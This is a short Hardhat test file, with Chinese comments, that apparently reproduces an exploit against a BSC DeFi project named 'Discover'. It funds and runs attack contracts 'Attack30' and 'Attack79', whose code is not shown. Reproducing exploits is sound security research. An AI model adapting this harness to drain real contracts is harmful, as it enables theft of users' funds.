const {
    time,
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers"); // 时间、快照插件
const {expect} = require("@nomicfoundation/hardhat-toolbox"); // 断言插件
const {ethers} = require("hardhat"); // ethers库，与区块链的交互库，轻量级且强大
const {beforeAttack_tranferToAttack} = require("../scripts/Discover-reproduction");
const {deployContract} = require('../scripts/Attack-Deploy');

const BEP20USDTAbi = require('../artifacts/contracts/BSC-USD.sol/BEP20USDT.json').abi;

describe('Attack Test', function () {
    it('should perform the attack successfully', async function () {
        const users = await ethers.getSigners();
        const attacker = users[0];
        //
        // // 部署 Attack30 合约
        const attack30 = await deployContract('Attack30');
        // await attack30.waitForDeployment();
        const attack30Addr = await attack30.getAddress();


        await beforeAttack_tranferToAttack(attacker, attack30Addr);


        await attack30.invest();


        const attack79 = await deployContract('Attack79', [await attack30.getAddress()]);
        await attack79.waitForDeployment();


        await attack79.attackBegin();
    });
})

